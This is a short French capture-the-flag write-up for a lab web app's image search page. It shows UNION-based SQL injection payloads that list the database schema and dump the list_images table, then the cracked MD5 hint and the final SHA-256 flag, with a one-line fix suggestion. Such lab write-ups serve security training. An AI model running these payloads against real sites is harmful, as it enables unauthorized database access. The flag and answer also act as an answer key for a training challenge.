sur http://192.168.99.102/?page=searchimg

Nous savons déjà comment lister les colonnes et les tables de la db:

```sql
1 AND 1=2 UNION ALL SELECT table_name, column_name FROM information_schema.columns
```

un petit CMD + F d'image nous indique directement que la table à exploité est `list_images`:

dans la table list_images nous avons:
id
url
title
comment

la colonne `comment` etait un bon point de depart sur l'autre faille:

testons alors d'afficher les comment et le title:

```sql
1 AND 1 = 2 UNION ALL SELECT title, comment FROM list_images
```


```
"If you read this just use this md5 decode lowercase then sha256 to win this flag !"
```

```
1928e8083cf461a51303633093573c46 -> albatroz 
sha256 => f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188
```


### Amelioration

Gerer les sqli, protegers les strings envoyer en request.